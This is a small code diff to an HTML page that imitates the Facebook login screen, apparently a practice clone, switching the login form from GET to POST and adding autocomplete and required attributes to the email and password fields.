@@ -12,9 +12,9 @@
             <h1>facebook</h1>
             <p>Connect with friends and the world <br> around you on Facebook.</p>
         </article>
-        <form action="cadastro.js" method="get">
-            <input type="text" name="texto" id="idtexto" placeholder="Email or phone number">
-            <input type="password" name="senha" id="idsenha" placeholder="Password">
+        <form action="cadastro.js" method="post">
+            <input type="text" name="texto" id="idtexto" placeholder="Email or phone number"  autocomplete="email" required>
+            <input type="password" name="senha" id="idsenha" placeholder="Password" autocomplete="current-password" required>
             <input id="login" type="submit" value="Login">
             <a href="#">Forgot password?</a>
             <hr>
